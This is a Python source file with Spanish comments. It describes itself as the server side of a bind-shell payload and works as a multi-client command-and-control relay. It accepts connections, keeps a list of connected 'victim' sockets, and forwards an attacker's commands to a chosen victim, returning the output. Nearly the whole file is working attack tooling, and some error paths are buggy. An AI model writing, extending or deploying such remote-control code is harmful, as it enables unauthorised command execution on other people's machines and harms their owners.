"""
Este módulo presenta el lado del servidor de un shellcode de tipo bind
Este es esencialmente el payload
"""

import subprocess
import threading
import socket
import sys
import os
import codecs

FIN_COMANDO = b'#00#'
lista_clientes = []
numclient = 0
#---------------------------mandar---------------------------------
def mandar_mensaje(mensaje, socket):
    """
    Envia un mensaje a través del socket establecido
    El mensaje debe ser una cadena binaria
    """
    mensaje += FIN_COMANDO
    socket.send(mensaje)

def leer_respuesta(socket):
    """
    Lee el canal de comunicación del servidor y reconstruye
    la salida asociada
    """
    salida = socket.recv(2048)
    while not salida.endswith(FIN_COMANDO):
        salida += socket.recv(2048)
    a_quitar_caracteres = len(FIN_COMANDO)
    return salida[:-a_quitar_caracteres]


def mandar_comando(comando, socket):
    """
    Envía el comando a través del socket, haciendo conversiones necesarias
    Espera la respuesta del cliente y la regresa
    comando viene como str
    """
    #comando = comando.encode('utf-8') # convertir a binario
    comando += FIN_COMANDO
    socket.send(comando)
    salida = leer_respuesta(socket)
    return salida

def desplegar_salida_comando(salida):
    """
    Despliega la salida regresada por el servidor
    salida es una cadena binaria
    """
    salida = salida.decode('utf-8')
    print(salida)


def leer_comandos(socket):
    """
    Función con la interfaz de usuario "shell"
    """
    comando = ''
    while comando != 'exit': 
        comando = input('$> ') # lee un str no binario
        respuesta = mandar_comando(comando, socket)
        desplegar_salida_comando(respuesta)
    socket.close()

#--------------------------recibir--------------------------------------

def leer_comando(cliente):
    """
    Lee el canal de comunicación del cliente y reconstruye
    el comando asociado
    """
    comando = cliente.recv(2048)
    while not comando.endswith(FIN_COMANDO):
        comando += cliente.recv(2048)
    a_quitar_caracteres = len(FIN_COMANDO)
    return comando[:-a_quitar_caracteres]


def ver_lista(lista_clientes):
    x=1
    for cliente in lista_clientes:
        print('cliente %s :' % x)
        print(cliente)
        x+=1

def guardar_lista_clientes(sockcliente):
    lista_clientes.append(sockcliente)

def mandar_lista(lista, socket):
    """
    Envía el comando a través del socket, haciendo conversiones necesarias
    Espera la respuesta del cliente y la regresa
    comando viene como str
    """
    x = 0
    for cliente in lista:
        x += 1
        if cliente == socket:
            x = x-1
            lista.pop(x)

    mens = "Clientes disponibles {}".format(x).encode('utf-8')

    mens += FIN_COMANDO
    socket.send(mens)


def atender_clienteatack(clienteat):
    comando = ''
    while comando != b'exit':
        comando = leer_comando(clienteat)
        if comando.startswith(b'ver'):
            mandar_lista(lista_clientes, clienteat)
        else:
            comandostr = codecs.decode(comando, 'utf-8')
            try:
                comandocliente = comandostr.split(",")
                comandof = comandocliente[0].encode('utf-8')
                numeroclientev = comandocliente[1]
                numclient=int(numeroclientev)
                numclient = numclient
            except:
                respuesta=False

            if numclient <= 0:
                    mandar_mensaje(b'El cliente no existe', clienteat)
            else:
                clientevic = lista_clientes[numclient-1]
                respuesta = mandar_comando(comandof,clientevic)

            if respuesta == False: #hubo error
                mandar_mensaje(b'El comando anterior produjo un error', clienteat)
            else:
                mandar_mensaje(respuesta, clienteat)    
    clienteat.close()



#---------------------------------------------------------------------#

        
def inicializar_servidor(puerto):
    """
    Crea el servidor bind y se queda esperando
    """
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind(('', int(puerto)))  # hace el bind en cualquier interfaz disponible

    servidor.listen(5) # peticiones de conexion simultaneas
    print('Escuchando peticiones en el puerto %s' % puerto)
    
    while True:
        cliente, addr = servidor.accept()
        guardar_lista_clientes(cliente)
        hilo = threading.Thread(target=atender_clienteatack, args=(cliente, ))
        print('Iniciando atención a cliente')
        print(addr)
        hilo.start()
        
if __name__ == '__main__':
    puerto = sys.argv[1]
    inicializar_servidor(puerto)
    
